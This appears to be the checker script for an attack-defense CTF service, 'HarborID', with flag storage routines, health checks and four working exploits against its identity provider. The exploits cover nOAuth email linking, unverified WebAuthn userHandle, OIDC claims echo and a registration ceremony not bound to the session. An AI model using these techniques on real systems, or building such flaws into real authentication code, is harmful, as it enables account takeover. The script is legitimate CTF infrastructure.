"""Harbor ID checker for H7CTF'26 finals.

Store 0: crew handover notes (Portal board).
  putflag 0: register two IdP users A and B, create crew C, add B to C,
             A gets id_token (claims: crew in C), SSO into Portal, post flag note.
  getflag 0: re-login as A or B, SSO, read board, find flag.
  exploit 0: nOAuth - read A's email from attackInfo, change own email to A's,
             SSO into Portal, impersonate A and read board.
  exploit 2: claims echo - request crew C via OIDC claims value in id_token, merge into Portal.

Store 1: break-glass note (IdP account).
  putflag 1: register user U, break_glass_note = flag.
  getflag 1: re-login (username-first or usernameless), GET /account, find flag.
  exploit 1: userHandle not verified - sign with own cred, supply U's userHandle.
  exploit 3: ceremony not session-bound - begin as self, finish with U's user_id.

Checker error codes (HARBORID-<STEP>-<NN>):
  HARBORID-REG-01       user registration rejected by IdP
  HARBORID-REG-02       register returned no bootstrap token
  HARBORID-PASS-01      passkey registration failed
  HARBORID-AUTH-01      passkey authentication failed
  HARBORID-CREW-01      crew creation failed
  HARBORID-MEM-01       crew membership add failed
  HARBORID-TOKEN-01     id_token request failed
  HARBORID-SSO-01       portal SSO failed
  HARBORID-BOARD-01     portal board read failed
  HARBORID-NOTE-01      crew note post failed
  HARBORID-ACCT-01      IdP /account read failed
  HARBORID-ACCT-02      break_glass_note not in /account response
  HARBORID-WF-01        webfinger lookup failed
  HARBORID-DEVK-01      device key publish/fetch failed
"""
import asyncio
import json
import random
import secrets
import sys
from pathlib import Path
from typing import Optional

import httpx
from enochecker3 import (
    ChainDB, Enochecker,
    ExploitCheckerTaskMessage, GetflagCheckerTaskMessage,
    GetnoiseCheckerTaskMessage, HavocCheckerTaskMessage,
    MumbleException, OfflineException,
    PutflagCheckerTaskMessage, PutnoiseCheckerTaskMessage,
)
from enochecker3.utils import FlagSearcher

sys.path.insert(0, str(Path(__file__).parent))
import harborkey  # noqa: E402

IDP_PORT = 7001
PORTAL_PORT = 7011

checker = Enochecker("HarborID", IDP_PORT)

FIRST = ["arjun", "meera", "kavya", "ravi", "priya", "omar", "chen", "lina", "nadia", "ivan"]
LAST  = ["pilot", "manifest", "berth", "crane", "tide", "ledger", "beacon", "quay", "watch"]
CREW_BASE = ["Tug", "Crane", "Gate", "Dock", "Tide", "Quay", "Harbor", "Berth", "Watch", "Pilot"]
SUFFIXES  = ["Night", "Day", "Alpha", "Bravo", "Charlie", "Delta", "Echo"]
NOTE_WORDS = ["handover", "shift", "report", "status", "update", "log", "brief", "ops", "watch"]


def _uname() -> str:
    return f"{random.choice(FIRST)}.{random.choice(LAST)}{random.randint(10, 999)}"

def _email(u: str) -> str:
    return f"{u}@{random.choice(['harbor.city','portops.local','tide.crew'])}"

def _crew() -> str:
    return f"{random.choice(CREW_BASE)}-{random.randint(1,99)} {random.choice(SUFFIXES)}"

def _text() -> str:
    return " ".join(random.choice(NOTE_WORDS) for _ in range(random.randint(4, 9)))

def _idp(address: str) -> str:
    return f"http://{address}:{IDP_PORT}"

def _portal(address: str) -> str:
    h = address.replace("harbor-idp", "harbor-portal") if "harbor-idp" in address else address
    return f"http://{h}:{PORTAL_PORT}"


def _mumble_on_http(r: httpx.Response, code: str) -> None:
    if r.status_code >= 500:
        raise MumbleException(f"{code}: server error {r.status_code}")
    if r.status_code >= 400:
        raise MumbleException(f"{code}: {r.status_code} {r.text[:80]}")


async def _register_user(idp: str, c: httpx.AsyncClient,
                          break_glass: str = "") -> tuple[str, str, str]:
    """register user at IdP; returns (username, email, bootstrap_token)."""
    uname, email = _uname(), ""
    email = _email(uname)
    r = await c.post(f"{idp}/register",
                     json={"username": uname, "email": email, "break_glass_note": break_glass})
    if r.status_code != 201:
        raise MumbleException(f"HARBORID-REG-01: registration rejected {r.status_code}")
    data = r.json()
    bt = data.get("bootstrap_token")
    if not bt:
        raise MumbleException("HARBORID-REG-02: no bootstrap token from register")
    return uname, email, bt


async def _add_passkey(idp: str, uname: str, bootstrap_token: str) -> tuple[str, harborkey.Credential]:
    """register a passkey for user; returns (session_token, credential). runs in thread."""
    def _sync() -> tuple[str, harborkey.Credential]:
        with httpx.Client(timeout=15) as sc:
            # begin
            r = sc.post(f"{idp}/webauthn/register/begin", json={"username": uname},
                        headers={"Authorization": f"Bearer {bootstrap_token}"})
            if r.status_code != 200:
                raise MumbleException(f"HARBORID-PASS-01: register/begin failed {r.status_code}")
            opts = r.json()
            chal = opts["challenge"]
            sid = opts["sessionId"]
            user_id_b64 = opts["user"]["id"]
            import base64
            user_sub = base64.urlsafe_b64decode(user_id_b64 + "==").decode()

            import os
            from cryptography.hazmat.primitives.asymmetric import ec
            private_key = ec.generate_private_key(ec.SECP256R1())
            cred_id_bytes = os.urandom(16)
            cred_id = harborkey._b64u_enc(cred_id_bytes)

            auth_data = harborkey._make_auth_data(cred_id_bytes, private_key, sign_count=0, attested=True)
            att_obj = harborkey._make_attestation_object(auth_data)
            client_data = harborkey._make_client_data("webauthn.create", chal)

            r2 = sc.post(f"{idp}/webauthn/register/finish", json={
                "sessionId": sid,
                "user_id": user_sub,
                "response": {
                    "id": cred_id,
                    "type": "public-key",
                    "response": {
                        "clientDataJSON": harborkey._b64u_enc(client_data),
                        "attestationObject": harborkey._b64u_enc(att_obj),
                    },
                },
            })
            if r2.status_code != 200:
                raise MumbleException(f"HARBORID-PASS-01: register/finish failed {r2.status_code}: {r2.text[:80]}")
            tok = r2.json().get("token")
            if not tok:
                raise MumbleException("HARBORID-PASS-01: no session token from register/finish")
            cred = harborkey.Credential(cred_id, private_key, user_sub)
            return tok, cred

    return await asyncio.to_thread(_sync)


async def _authenticate(idp: str, cred: harborkey.Credential,
                         username: str | None = None) -> str:
    """authenticate with existing cred; returns session token."""
    def _sync() -> str:
        with httpx.Client(timeout=15) as sc:
            return harborkey.authenticate(idp, cred, username=username, client=sc)
    return await asyncio.to_thread(_sync)


async def _authenticate_as(idp: str, cred: harborkey.Credential, victim_sub: str) -> str:
    """exploit: sign with own cred, claim victim's userHandle."""
    def _sync() -> str:
        with httpx.Client(timeout=15) as sc:
            return harborkey.authenticate_as(idp, cred, victim_sub, client=sc)
    return await asyncio.to_thread(_sync)


async def _get_id_token(idp: str, session_token: str, c: httpx.AsyncClient,
                         claims: dict | None = None, nonce: str = "") -> str:
    params: dict = {}
    if nonce:
        params["nonce"] = nonce
    if claims:
        params["claims"] = json.dumps(claims)
    r = await c.get(f"{idp}/account/token", params=params,
                    headers={"Authorization": f"Bearer {session_token}"})
    if r.status_code != 200:
        raise MumbleException(f"HARBORID-TOKEN-01: id_token request failed {r.status_code}")
    return r.json().get("id_token", "")


async def _sso(portal: str, id_token: str, c: httpx.AsyncClient) -> str:
    r = await c.post(f"{portal}/crew/session", json={"id_token": id_token})
    if r.status_code != 200:
        raise MumbleException(f"HARBORID-SSO-01: portal SSO failed {r.status_code}: {r.text[:80]}")
    return r.json().get("token", "")


# ── store 0: crew handover notes ─────────────────────────────────────────────

async def _putflag_notes_impl(task: PutflagCheckerTaskMessage, client: httpx.AsyncClient,
                               db: ChainDB) -> str:
    idp, portal = _idp(task.address), _portal(task.address)
    try:
        # user A: will post the flag note
        uname_a, email_a, bt_a = await _register_user(idp, client)
        tok_a, cred_a = await _add_passkey(idp, uname_a, bt_a)

        # user B: another crew member (attacker needs their email too)
        uname_b, email_b, bt_b = await _register_user(idp, client)
        _tok_b, cred_b = await _add_passkey(idp, uname_b, bt_b)

        # create crew, add B
        crew_name = _crew()
        r = await client.post(f"{idp}/crews", json={"name": crew_name},
                              headers={"Authorization": f"Bearer {tok_a}"})
        _mumble_on_http(r, "HARBORID-CREW-01")
        crew_id = r.json()["id"]

        r = await client.post(f"{idp}/crews/{crew_id}/members", json={"username": uname_b},
                              headers={"Authorization": f"Bearer {tok_a}"})
        _mumble_on_http(r, "HARBORID-MEM-01")

        # A gets id_token with crew claim (requests acr essential)
        claims_param = {"id_token": {"acr": {"essential": True, "value": "urn:harbor:passkey"}}}
        id_token_a = await _get_id_token(idp, tok_a, client, claims=claims_param)
        portal_tok_a = await _sso(portal, id_token_a, client)

        # post flag note as A to crew C
        r = await client.post(f"{portal}/crew/notes",
                               json={"crew_name": crew_name, "text": task.flag},
                               headers={"Authorization": f"Bearer {portal_tok_a}"})
        _mumble_on_http(r, "HARBORID-NOTE-01")
        note_id = r.json().get("id", "")

        state = {
            "uname_a": uname_a, "email_a": email_a,
            "uname_b": uname_b, "email_b": email_b,
            "crew_name": crew_name,
            "cred_a": cred_a.to_dict(),
            "cred_b": cred_b.to_dict(),
            "note_id": note_id,
        }
        await db.set("store0", state)
        return json.dumps({"crew": crew_name, "author": uname_a, "email": email_a})

    except (httpx.ConnectError, httpx.TimeoutException) as e:
        raise OfflineException(f"HARBORID-NET-01: IdP unreachable: {e}")


@checker.putflag(0)
async def putflag_notes(task: PutflagCheckerTaskMessage, client: httpx.AsyncClient,
                         db: ChainDB) -> str:
    return await _putflag_notes_impl(task, client, db)


async def _getflag_notes_impl(task: GetflagCheckerTaskMessage, client: httpx.AsyncClient,
                               db: ChainDB) -> None:
    idp, portal = _idp(task.address), _portal(task.address)
    try:
        state = await db.get("store0")
    except KeyError:
        raise MumbleException("HARBORID-BOARD-01: no putflag state in chainDB")

    try:
        # re-login as A or B at random
        use_b = random.random() < 0.4
        cred = harborkey.Credential.from_dict(state["cred_b" if use_b else "cred_a"])
        uname = state["uname_b" if use_b else "uname_a"]
        tok = await _authenticate(idp, cred, username=uname if random.random() < 0.5 else None)

        id_token = await _get_id_token(idp, tok, client)
        portal_tok = await _sso(portal, id_token, client)

        r = await client.get(f"{portal}/crew/board",
                              headers={"Authorization": f"Bearer {portal_tok}"})
        _mumble_on_http(r, "HARBORID-BOARD-01")
        data = r.json()
        all_text = json.dumps(data)
        if task.flag not in all_text:
            raise MumbleException(f"HARBORID-BOARD-01: flag not found on crew board")

    except (httpx.ConnectError, httpx.TimeoutException) as e:
        raise OfflineException(f"HARBORID-NET-01: service unreachable: {e}")


@checker.getflag(0)
async def getflag_notes(task: GetflagCheckerTaskMessage, client: httpx.AsyncClient,
                         db: ChainDB) -> None:
    return await _getflag_notes_impl(task, client, db)


# ── store 1: break-glass note ────────────────────────────────────────────────

async def _putflag_breakglass_impl(task: PutflagCheckerTaskMessage, client: httpx.AsyncClient,
                                    db: ChainDB) -> str:
    idp = _idp(task.address)
    try:
        uname, email, bt = await _register_user(idp, client, break_glass=task.flag)
        tok, cred = await _add_passkey(idp, uname, bt)
        await db.set("store1", {"uname": uname, "email": email,
                                 "cred": cred.to_dict(), "sub": cred.user_id})
        return json.dumps({"username": uname})

    except (httpx.ConnectError, httpx.TimeoutException) as e:
        raise OfflineException(f"HARBORID-NET-01: IdP unreachable: {e}")


@checker.putflag(1)
async def putflag_breakglass(task: PutflagCheckerTaskMessage, client: httpx.AsyncClient,
                              db: ChainDB) -> str:
    return await _putflag_breakglass_impl(task, client, db)


async def _getflag_breakglass_impl(task: GetflagCheckerTaskMessage, client: httpx.AsyncClient,
                                    db: ChainDB) -> None:
    idp = _idp(task.address)
    try:
        state = await db.get("store1")
    except KeyError:
        raise MumbleException("HARBORID-ACCT-01: no putflag state in chainDB")

    try:
        cred = harborkey.Credential.from_dict(state["cred"])
        # alternate username-first and usernameless
        uname = state["uname"] if random.random() < 0.5 else None
        tok = await _authenticate(idp, cred, username=uname)

        r = await client.get(f"{idp}/account",
                              headers={"Authorization": f"Bearer {tok}"})
        _mumble_on_http(r, "HARBORID-ACCT-01")
        data = r.json()
        if task.flag not in data.get("break_glass_note", ""):
            raise MumbleException("HARBORID-ACCT-02: break_glass_note missing or wrong")

    except (httpx.ConnectError, httpx.TimeoutException) as e:
        raise OfflineException(f"HARBORID-NET-01: service unreachable: {e}")


@checker.getflag(1)
async def getflag_breakglass(task: GetflagCheckerTaskMessage, client: httpx.AsyncClient,
                              db: ChainDB) -> None:
    return await _getflag_breakglass_impl(task, client, db)


# ── store 2: crew notes alias (for claims-echo exploit testing) ───────────────

@checker.putflag(2)
async def putflag_notes2(task: PutflagCheckerTaskMessage, client: httpx.AsyncClient,
                          db: ChainDB) -> str:
    return await _putflag_notes_impl(task, client, db)


@checker.getflag(2)
async def getflag_notes2(task: GetflagCheckerTaskMessage, client: httpx.AsyncClient,
                          db: ChainDB) -> None:
    return await _getflag_notes_impl(task, client, db)


# ── store 3: break-glass alias (for ceremony-hijack exploit testing) ──────────

@checker.putflag(3)
async def putflag_breakglass3(task: PutflagCheckerTaskMessage, client: httpx.AsyncClient,
                               db: ChainDB) -> str:
    return await _putflag_breakglass_impl(task, client, db)


@checker.getflag(3)
async def getflag_breakglass3(task: GetflagCheckerTaskMessage, client: httpx.AsyncClient,
                               db: ChainDB) -> None:
    return await _getflag_breakglass_impl(task, client, db)


# ── noise ─────────────────────────────────────────────────────────────────────

@checker.putnoise(0)
async def putnoise(task: PutnoiseCheckerTaskMessage, client: httpx.AsyncClient,
                   db: ChainDB) -> None:
    idp, portal = _idp(task.address), _portal(task.address)
    try:
        uname, email, bt = await _register_user(idp, client, break_glass=_text())
        tok, cred = await _add_passkey(idp, uname, bt)

        crew_name = _crew()
        r = await client.post(f"{idp}/crews", json={"name": crew_name},
                              headers={"Authorization": f"Bearer {tok}"})
        _mumble_on_http(r, "HARBORID-CREW-01")

        id_token = await _get_id_token(idp, tok, client)
        portal_tok = await _sso(portal, id_token, client)

        note_text = _text()
        r = await client.post(f"{portal}/crew/notes",
                               json={"crew_name": crew_name, "text": note_text},
                               headers={"Authorization": f"Bearer {portal_tok}"})
        _mumble_on_http(r, "HARBORID-NOTE-01")
        await db.set("noise0", {"uname": uname, "crew": crew_name, "text": note_text,
                                 "cred": cred.to_dict()})

    except (httpx.ConnectError, httpx.TimeoutException) as e:
        raise OfflineException(f"HARBORID-NET-01: service unreachable: {e}")


@checker.getnoise(0)
async def getnoise(task: GetnoiseCheckerTaskMessage, client: httpx.AsyncClient,
                   db: ChainDB) -> None:
    idp, portal = _idp(task.address), _portal(task.address)
    try:
        state = await db.get("noise0")
    except KeyError:
        raise MumbleException("HARBORID-BOARD-01: noise state missing")

    try:
        cred = harborkey.Credential.from_dict(state["cred"])
        tok = await _authenticate(idp, cred, username=state["uname"])
        id_token = await _get_id_token(idp, tok, client)
        portal_tok = await _sso(portal, id_token, client)
        r = await client.get(f"{portal}/crew/board",
                              headers={"Authorization": f"Bearer {portal_tok}"})
        _mumble_on_http(r, "HARBORID-BOARD-01")
        if state["text"] not in json.dumps(r.json()):
            raise MumbleException("HARBORID-BOARD-01: noise note content missing")

    except (httpx.ConnectError, httpx.TimeoutException) as e:
        raise OfflineException(f"HARBORID-NET-01: service unreachable: {e}")


# ── havoc ─────────────────────────────────────────────────────────────────────

@checker.havoc(0)
async def havoc_email_change(task: HavocCheckerTaskMessage, client: httpx.AsyncClient) -> None:
    """change email: re-auth still works, IdP account shows new email."""
    idp = _idp(task.address)
    try:
        uname, email, bt = await _register_user(idp, client)
        tok, cred = await _add_passkey(idp, uname, bt)

        # change email
        new_email = _email(uname + "x")
        r = await client.patch(f"{idp}/account/email", json={"email": new_email},
                               headers={"Authorization": f"Bearer {tok}"})
        _mumble_on_http(r, "HARBORID-ACCT-01")

        # re-authenticate and check account reflects new email
        tok2 = await _authenticate(idp, cred, username=uname)
        r = await client.get(f"{idp}/account", headers={"Authorization": f"Bearer {tok2}"})
        _mumble_on_http(r, "HARBORID-ACCT-01")
        if r.json().get("email") != new_email:
            raise MumbleException("HARBORID-ACCT-01: email not updated in account")
        if r.json().get("username") != uname:
            raise MumbleException("HARBORID-ACCT-01: username wrong after email change")

    except (httpx.ConnectError, httpx.TimeoutException) as e:
        raise OfflineException(f"HARBORID-NET-01: service unreachable: {e}")


@checker.havoc(1)
async def havoc_multi_crew(task: HavocCheckerTaskMessage, client: httpx.AsyncClient) -> None:
    """user belongs to multiple crews; all boards visible after single SSO."""
    idp, portal = _idp(task.address), _portal(task.address)
    try:
        uname, _, bt = await _register_user(idp, client)
        tok, cred = await _add_passkey(idp, uname, bt)

        # create two crews as the same user
        c1, c2 = _crew(), _crew() + "-b"
        r = await client.post(f"{idp}/crews", json={"name": c1},
                              headers={"Authorization": f"Bearer {tok}"})
        _mumble_on_http(r, "HARBORID-CREW-01")
        r = await client.post(f"{idp}/crews", json={"name": c2},
                              headers={"Authorization": f"Bearer {tok}"})
        _mumble_on_http(r, "HARBORID-CREW-01")

        id_token = await _get_id_token(idp, tok, client)
        portal_tok = await _sso(portal, id_token, client)

        # post notes to both crews
        t1, t2 = _text(), _text()
        r = await client.post(f"{portal}/crew/notes",
                               json={"crew_name": c1, "text": t1},
                               headers={"Authorization": f"Bearer {portal_tok}"})
        _mumble_on_http(r, "HARBORID-NOTE-01")
        r = await client.post(f"{portal}/crew/notes",
                               json={"crew_name": c2, "text": t2},
                               headers={"Authorization": f"Bearer {portal_tok}"})
        _mumble_on_http(r, "HARBORID-NOTE-01")

        # board should show notes from both crews
        r = await client.get(f"{portal}/crew/board",
                              headers={"Authorization": f"Bearer {portal_tok}"})
        _mumble_on_http(r, "HARBORID-BOARD-01")
        body = json.dumps(r.json())
        if t1 not in body or t2 not in body:
            raise MumbleException("HARBORID-BOARD-01: notes from multi-crew not on board")

    except (httpx.ConnectError, httpx.TimeoutException) as e:
        raise OfflineException(f"HARBORID-NET-01: service unreachable: {e}")


@checker.havoc(2)
async def havoc_second_passkey(task: HavocCheckerTaskMessage, client: httpx.AsyncClient) -> None:
    """add a second passkey and log in with it; also test usernameless login."""
    idp = _idp(task.address)
    try:
        uname, _, bt = await _register_user(idp, client)
        tok, cred1 = await _add_passkey(idp, uname, bt)

        # add second passkey
        _tok2, cred2 = await _add_passkey(idp, uname, tok)

        # login with second passkey, username-first
        tok3 = await _authenticate(idp, cred2, username=uname)
        r = await client.get(f"{idp}/account", headers={"Authorization": f"Bearer {tok3}"})
        _mumble_on_http(r, "HARBORID-ACCT-01")
        if r.json().get("username") != uname:
            raise MumbleException("HARBORID-ACCT-01: wrong account after second-passkey login")

        # usernameless login
        tok4 = await _authenticate(idp, cred2, username=None)
        r = await client.get(f"{idp}/account", headers={"Authorization": f"Bearer {tok4}"})
        _mumble_on_http(r, "HARBORID-ACCT-01")
        if r.json().get("username") != uname:
            raise MumbleException("HARBORID-ACCT-01: wrong account after usernameless login")

    except (httpx.ConnectError, httpx.TimeoutException) as e:
        raise OfflineException(f"HARBORID-NET-01: service unreachable: {e}")


@checker.havoc(3)
async def havoc_device_key(task: HavocCheckerTaskMessage, client: httpx.AsyncClient) -> None:
    """publish a device JWKS and fetch it via /u/<user>/jwks.json."""
    idp = _idp(task.address)
    try:
        uname, _, bt = await _register_user(idp, client)
        tok, _ = await _add_passkey(idp, uname, bt)

        from cryptography.hazmat.primitives.asymmetric import ec
        from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat
        import base64
        priv = ec.generate_private_key(ec.SECP256R1())
        pub = priv.public_key()
        nums = pub.public_numbers()
        x = base64.urlsafe_b64encode(nums.x.to_bytes(32, "big")).rstrip(b"=").decode()
        y = base64.urlsafe_b64encode(nums.y.to_bytes(32, "big")).rstrip(b"=").decode()
        kid = secrets.token_hex(8)
        jwks = {"keys": [{"kty": "EC", "crv": "P-256", "x": x, "y": y, "kid": kid, "use": "sig"}]}

        r = await client.post(f"{idp}/u/{uname}/keys", json={"kid": kid, "jwks": jwks},
                              headers={"Authorization": f"Bearer {tok}"})
        _mumble_on_http(r, "HARBORID-DEVK-01")

        r2 = await client.get(f"{idp}/u/{uname}/jwks.json")
        _mumble_on_http(r2, "HARBORID-DEVK-01")
        keys = r2.json().get("keys", [])
        if not any(k.get("kid") == kid for k in keys):
            raise MumbleException(f"HARBORID-DEVK-01: published key not found in JWKS")

    except (httpx.ConnectError, httpx.TimeoutException) as e:
        raise OfflineException(f"HARBORID-NET-01: service unreachable: {e}")


@checker.havoc(4)
async def havoc_claims_legit(task: HavocCheckerTaskMessage, client: httpx.AsyncClient) -> None:
    """request acr (essential) via claims param; token includes it; OIDC claims filter probe."""
    idp, portal = _idp(task.address), _portal(task.address)
    try:
        uname, _, bt = await _register_user(idp, client)
        tok, cred = await _add_passkey(idp, uname, bt)
        crew = _crew()
        r = await client.post(f"{idp}/crews", json={"name": crew},
                              headers={"Authorization": f"Bearer {tok}"})
        _mumble_on_http(r, "HARBORID-CREW-01")

        # request crew with value = own crew (legitimate use of claims param)
        claims_param = {
            "id_token": {
                "acr": {"essential": True, "values": ["urn:harbor:passkey"]},
                "crew": {"value": crew}   # BUG probe: this is how the exploit works
            }
        }
        id_token = await _get_id_token(idp, tok, client, claims=claims_param)
        portal_tok = await _sso(portal, id_token, client)

        r = await client.get(f"{portal}/crew/memberships",
                              headers={"Authorization": f"Bearer {portal_tok}"})
        _mumble_on_http(r, "HARBORID-BOARD-01")
        if crew not in json.dumps(r.json()):
            raise MumbleException("HARBORID-BOARD-01: crew not in portal after claims SSO")

    except (httpx.ConnectError, httpx.TimeoutException) as e:
        raise OfflineException(f"HARBORID-NET-01: service unreachable: {e}")


# ── exploits ──────────────────────────────────────────────────────────────────

@checker.exploit(0)
async def exploit_nooauth(task: ExploitCheckerTaskMessage, searcher: FlagSearcher,
                           client: httpx.AsyncClient) -> Optional[str]:
    """store 0, V1: nOAuth email account linking."""
    idp, portal = _idp(task.address), _portal(task.address)
    info = json.loads(task.attack_info or "{}")
    victim_email = info.get("email", "")
    if not victim_email:
        raise MumbleException("exploit 0: no email in attackInfo")

    # register our own account with the victim's email
    uname, _, bt = await _register_user(idp, client)
    # overwrite email to victim's
    tok, cred = await _add_passkey(idp, uname, bt)
    r = await client.patch(f"{idp}/account/email", json={"email": victim_email},
                           headers={"Authorization": f"Bearer {tok}"})
    if r.status_code != 200:
        raise MumbleException(f"exploit 0: email change failed {r.status_code}")

    id_token = await _get_id_token(idp, tok, client)
    portal_tok = await _sso(portal, id_token, client)

    r = await client.get(f"{portal}/crew/board",
                          headers={"Authorization": f"Bearer {portal_tok}"})
    if r.status_code != 200:
        raise MumbleException(f"exploit 0: board read failed {r.status_code}")
    flag = searcher.search_flag(json.dumps(r.json()))
    if flag:
        return flag
    raise MumbleException("exploit 0: no flag on board")


@checker.exploit(1)
async def exploit_userhandle(task: ExploitCheckerTaskMessage, searcher: FlagSearcher,
                              client: httpx.AsyncClient) -> Optional[str]:
    """store 1, V1: userHandle not checked against credential owner."""
    idp = _idp(task.address)
    info = json.loads(task.attack_info or "{}")
    victim_username = info.get("username", "")
    if not victim_username:
        raise MumbleException("exploit 1: no username in attackInfo")

    # get victim's sub via webfinger
    r = await client.get(f"{idp}/.well-known/webfinger",
                          params={"resource": f"acct:{victim_username}@harbor.city"})
    if r.status_code != 200:
        raise MumbleException(f"exploit 1: webfinger failed {r.status_code}")
    victim_sub = r.json().get("sub", "")
    if not victim_sub:
        raise MumbleException("exploit 1: no sub in webfinger response")

    # register our own account and credential
    uname, _, bt = await _register_user(idp, client)
    tok, cred = await _add_passkey(idp, uname, bt)

    # authenticate with our cred but victim's userHandle
    try:
        tok_as_victim = await _authenticate_as(idp, cred, victim_sub)
    except Exception as e:
        raise MumbleException(f"exploit 1: authenticate_as failed: {e}")

    r = await client.get(f"{idp}/account",
                          headers={"Authorization": f"Bearer {tok_as_victim}"})
    if r.status_code != 200:
        raise MumbleException(f"exploit 1: account read failed {r.status_code}")
    flag = searcher.search_flag(json.dumps(r.json()))
    if flag:
        return flag
    raise MumbleException("exploit 1: no flag in account")


@checker.exploit(2)
async def exploit_claims_echo(task: ExploitCheckerTaskMessage, searcher: FlagSearcher,
                               client: httpx.AsyncClient) -> Optional[str]:
    """store 0, V2: OIDC claims echo - request crew by value."""
    idp, portal = _idp(task.address), _portal(task.address)
    info = json.loads(task.attack_info or "{}")
    crew_name = info.get("crew", "")
    if not crew_name:
        raise MumbleException("exploit 2: no crew in attackInfo")

    # register an account with no crew membership
    uname, _, bt = await _register_user(idp, client)
    tok, _ = await _add_passkey(idp, uname, bt)

    # request id_token with crew.value = victim crew
    claims_param = {"id_token": {"crew": {"value": crew_name}}}
    id_token = await _get_id_token(idp, tok, client, claims=claims_param)
    portal_tok = await _sso(portal, id_token, client)

    r = await client.get(f"{portal}/crew/board",
                          headers={"Authorization": f"Bearer {portal_tok}"})
    if r.status_code != 200:
        raise MumbleException(f"exploit 2: board read failed {r.status_code}")
    flag = searcher.search_flag(json.dumps(r.json()))
    if flag:
        return flag
    raise MumbleException("exploit 2: no flag on board via claims echo")


@checker.exploit(3)
async def exploit_ceremony_hijack(task: ExploitCheckerTaskMessage, searcher: FlagSearcher,
                                   client: httpx.AsyncClient) -> Optional[str]:
    """store 1, V2: registration ceremony not session-bound."""
    idp = _idp(task.address)
    info = json.loads(task.attack_info or "{}")
    victim_username = info.get("username", "")
    if not victim_username:
        raise MumbleException("exploit 3: no username in attackInfo")

    # get victim's sub via webfinger
    r = await client.get(f"{idp}/.well-known/webfinger",
                          params={"resource": f"acct:{victim_username}@harbor.city"})
    if r.status_code != 200:
        raise MumbleException(f"exploit 3: webfinger failed {r.status_code}")
    victim_sub = r.json().get("sub", "")

    # register ourselves (get a session for the begin step)
    uname, _, bt = await _register_user(idp, client)
    tok, _ = await _add_passkey(idp, uname, bt)

    # call register/begin as ourselves
    r = await client.post(f"{idp}/webauthn/register/begin", json={"username": uname},
                           headers={"Authorization": f"Bearer {tok}"})
    if r.status_code != 200:
        raise MumbleException(f"exploit 3: register/begin failed {r.status_code}")
    opts = r.json()
    chal = opts["challenge"]
    sid = opts["sessionId"]

    # generate a keypair
    import os
    from cryptography.hazmat.primitives.asymmetric import ec as _ec
    priv = _ec.generate_private_key(_ec.SECP256R1())
    cred_id_bytes = os.urandom(16)
    cred_id = harborkey._b64u_enc(cred_id_bytes)
    auth_data = harborkey._make_auth_data(cred_id_bytes, priv, sign_count=0, attested=True)
    att_obj = harborkey._make_attestation_object(auth_data)
    client_data = harborkey._make_client_data("webauthn.create", chal)

    # finish with victim's user_id (BUG: server trusts body.user_id)
    r = await client.post(f"{idp}/webauthn/register/finish", json={
        "sessionId": sid,
        "user_id": victim_sub,   # claim to be the victim
        "response": {
            "id": cred_id,
            "type": "public-key",
            "response": {
                "clientDataJSON": harborkey._b64u_enc(client_data),
                "attestationObject": harborkey._b64u_enc(att_obj),
            },
        },
    })
    if r.status_code != 200:
        raise MumbleException(f"exploit 3: register/finish failed {r.status_code}: {r.text[:80]}")
    new_tok = r.json().get("token", "")
    if not new_tok:
        raise MumbleException("exploit 3: no token from register/finish")

    r = await client.get(f"{idp}/account", headers={"Authorization": f"Bearer {new_tok}"})
    if r.status_code != 200:
        raise MumbleException(f"exploit 3: account read failed {r.status_code}")
    flag = searcher.search_flag(json.dumps(r.json()))
    if flag:
        return flag
    raise MumbleException("exploit 3: no flag in account")


app = checker.app
